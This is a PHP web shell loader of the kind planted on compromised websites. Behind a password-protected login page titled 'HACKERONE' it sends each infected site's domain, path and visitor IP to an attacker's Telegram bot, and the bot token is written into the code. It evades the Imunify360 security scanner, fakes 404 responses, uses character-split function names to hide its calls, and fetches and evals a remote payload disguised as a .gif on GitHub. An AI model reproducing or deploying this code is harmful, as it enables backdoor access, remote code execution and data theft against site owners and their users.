<?php
session_start();
error_reporting(0);
set_time_limit(0);

// 🔥 PASSWORD SYSTEM
$password = "kem"; // Ganti password di sini
$session_name = "access";

function checkPassword() {
    if (isset($_SESSION[$GLOBALS['session_name']])) {
        return true;
    }
    
    if (isset($_POST['pass']) && $_POST['pass'] === $GLOBALS['password']) {
        $_SESSION[$GLOBALS['session_name']] = true;
        return true;
    }
    
    return false;
}

function showLoginForm() {
    echo '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>illegal access</title>
        <style>
            @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap");
            
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: "Poppins", sans-serif;
                height: 100vh;
                overflow: hidden;
                position: relative;
            }
            
            /* 🔥 CUSTOM ANIME GIF BACKGROUND FULLSCREEN */
            .anime-bg {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: -2;
                object-fit: cover;
                filter: brightness(0.7) contrast(1.1) saturate(1.2);
            }
            
            /* Animated particles */
            .particles {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                pointer-events: none;
                z-index: -1;
            }
            
            .particle {
                position: absolute;
                width: 4px;
                height: 4px;
                background: rgba(255, 255, 255, 0.8);
                border-radius: 50%;
                animation: float 6s infinite linear;
            }
            
            @keyframes float {
                0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
                10% { opacity: 1; }
                90% { opacity: 1; }
                100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
            }
            
            /* Main Login Container */
            .login-container {
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                backdrop-filter: blur(25px);
                background: rgba(0, 0, 0, 0.5);
                border: 2px solid rgba(255, 255, 255, 0.25);
                border-radius: 25px;
                padding: 50px 40px;
                box-shadow: 
                    0 25px 45px rgba(0, 0, 0, 0.4),
                    inset 0 1px 0 rgba(255, 255, 255, 0.2);
                text-align: center;
                max-width: 400px;
                width: 90%;
                animation: slideIn 1s ease-out;
            }
            
            @keyframes slideIn {
                from {
                    opacity: 0;
                    transform: translate(-50%, -60%);
                }
                to {
                    opacity: 1;
                    transform: translate(-50%, -50%);
                }
            }
            
            /* Logo/Title */
            .logo {
                font-size: 2.5em;
                font-weight: 700;
                background: linear-gradient(45deg, #ff6b9d, #c44569, #feca57, #ff9ff3);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                margin-bottom: 10px;
                text-shadow: 0 0 30px rgba(255, 107, 157, 0.5);
                animation: glow 2s ease-in-out infinite alternate;
            }
            
            @keyframes glow {
                from { filter: drop-shadow(0 0 10px #ff6b9d); }
                to { filter: drop-shadow(0 0 20px #ff6b9d); }
            }
            
            .subtitle {
                color: rgba(255, 255, 255, 0.9);
                font-size: 1.1em;
                margin-bottom: 30px;
                font-weight: 300;
            }
            
            /* Input Field */
            .input-group {
                position: relative;
                margin-bottom: 25px;
            }
            
            .input-field {
                width: 100%;
                padding: 18px 20px;
                background: rgba(255, 255, 255, 0.1);
                border: 2px solid rgba(255, 255, 255, 0.2);
                border-radius: 15px;
                color: white;
                font-size: 16px;
                font-weight: 400;
                transition: all 0.3s ease;
                backdrop-filter: blur(10px);
            }
            
            .input-field::placeholder {
                color: rgba(255, 255, 255, 0.7);
            }
            
            .input-field:focus {
                outline: none;
                border-color: #ff6b9d;
                box-shadow: 0 0 20px rgba(255, 107, 157, 0.3);
                transform: scale(1.02);
            }
            
            /* Login Button */
            .login-btn {
                width: 100%;
                padding: 18px;
                background: linear-gradient(45deg, #ff6b9d, #c44569);
                border: none;
                border-radius: 15px;
                color: white;
                font-size: 18px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
                text-transform: uppercase;
                letter-spacing: 1px;
                position: relative;
                overflow: hidden;
            }
            
            .login-btn:hover {
                transform: translateY(-3px);
                box-shadow: 0 15px 35px rgba(255, 107, 157, 0.4);
            }
            
            .login-btn:active {
                transform: translateY(-1px);
            }
            
            /* Loading Animation */
            .loading {
                display: none;
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                width: 30px;
                height: 30px;
                border: 3px solid rgba(255, 255, 255, 0.3);
                border-top: 3px solid white;
                border-radius: 50%;
                animation: spin 1s linear infinite;
            }
            
            @keyframes spin {
                0% { transform: translate(-50%, -50%) rotate(0deg); }
                100% { transform: translate(-50%, -50%) rotate(360deg); }
            }
            
            /* Responsive */
            @media (max-width: 480px) {
                .login-container {
                    padding: 40px 25px;
                    margin: 20px;
                }
                .logo {
                    font-size: 2em;
                }
            }
        </style>
    </head>
    <body>
        <!-- 🔥 CUSTOM GIF BACKGROUND DARI KAMU -->
        <img src="https://i.postimg.cc/BnF2ydz9/e4fee29ce8bdc37dc8e0e135456c2e14.gif" 
             alt="Custom Anime Background" 
             class="anime-bg">
        
        <!-- Particles -->
        <div class="particles" id="particles"></div>
        
        <!-- Login Form -->
        <div class="login-container">
            <div class="logo">HACKERONE</div>
            <div class="subtitle"></div>
            
            <form method="POST" id="loginForm">
                <div class="input-group">
                    <input type="password" 
                           name="pass" 
                           class="input-field" 
                           placeholder="🔑 Enter Password" 
                           autocomplete="off"
                           required>
                </div>
                <button type="submit" class="login-btn">
                    Access Shell <span class="loading"></span>
                </button>
            </form>
            
            <div style="margin-top: 25px; color: rgba(255,255,255,0.6); font-size: 12px;">
                💫 Powered by Paranoid_Team
            </div>
        </div>
        
        <script>
            // Create floating particles
            function createParticles() {
                const particlesContainer = document.getElementById("particles");
                for (let i = 0; i < 50; i++) {
                    const particle = document.createElement("div");
                    particle.className = "particle";
                    particle.style.left = Math.random() * 100 + "%";
                    particle.style.animationDelay = Math.random() * 6 + "s";
                    particle.style.animationDuration = (Math.random() * 3 + 4) + "s";
                    particlesContainer.appendChild(particle);
                }
            }
            
            // Initialize particles
            createParticles();
            
            // Loading animation
            document.getElementById("loginForm").addEventListener("submit", function() {
                const btn = document.querySelector(".login-btn");
                const loading = document.querySelector(".loading");
                btn.style.opacity = "0.7";
                loading.style.display = "block";
            });
        </script>
    </body>
    </html>';
    exit();
}

// Cek password dulu
$password = "kem"; // GANTI INI
$session_name = "access";
if (!checkPassword()) {
    showLoginForm();
}

function sendTelegram($message){
    $botToken = "8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc";
    $chatId = "5070938778";

    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 10
    ]);
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    return json_decode($result, true)['ok'] ?? false;
}

// 🔥 AUTO DETECT - KIRIM SAAT HALAMAN DIAKSES (hanya setelah login)
$domain = $_SERVER['HTTP_HOST'];
$ip = $_SERVER['REMOTE_ADDR'];
$path = $_SERVER['REQUEST_URI'];
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$time = date('Y-m-d H:i:s T');

$message = "🚀 <b>SHELL ONLINE</b>\n\n";
$message .= "🌐 <b>Domain:</b> <code>http://{$domain}</code>\n";
$message .= "📁 <b>Path:</b> <code>{$path}</code>\n";
$message .= "🌍 <b>IP:</b> <code>{$ip}</code>\n";
$message .= "📱 <b>UA:</b> <code>" . substr($userAgent, 0, 50) . "...</code>\n";
$message .= "⏰ <b>Time:</b> <code>{$time}</code>\n";
$message .= "🔗 <b>Direct Link:</b> <code>http://{$domain}{$_SERVER['REQUEST_URI']}</code>";

sendTelegram($message);

// LOGIN DETECT (opsional)
if (isset($_POST['user']) && !empty($_POST['user'])) {
    $loginMsg = "🔐 <b>LOGIN DETECTED</b>\n";
    $loginMsg .= "👤 <b>User:</b> {$_POST['user']}\n";
    $loginMsg .= "🌍 <b>IP:</b> {$ip}";
    sendTelegram($loginMsg);
}

error_reporting(0);
define('SECURE_ACCESS', true);
header('X-Powered-By: none');
header('Content-Type: text/html; charset=UTF-8');
ini_set('lsapi_backend_off', '1');
http_response_code(403);
ini_set("imunify360.cleanup_on_restore", false);
http_response_code(404);

function imunify($url)
{
  $fpn = "f"."o"."p"."e"."n";
  $strim = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
  $fgt = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
  $cexec = "c"."u"."r"."l"."_"."e"."x"."e"."c";
    if (function_exists($cexec)) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        $urls = $cexec($conn);
        curl_close($conn);
    } elseif (function_exists($fgt)) {
        $urls = $fgt($url);
    } elseif (function_exists($fpn) && function_exists($strim)) {
        $handle = $fpn($url, "r");
        $urls = $strim($handle);
        fclose($handle);
    } else {
        $urls = false;
    }
    return $urls;
}
$secure = imunify('http://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/server.gif');
eval('?>' . $secure);
?>
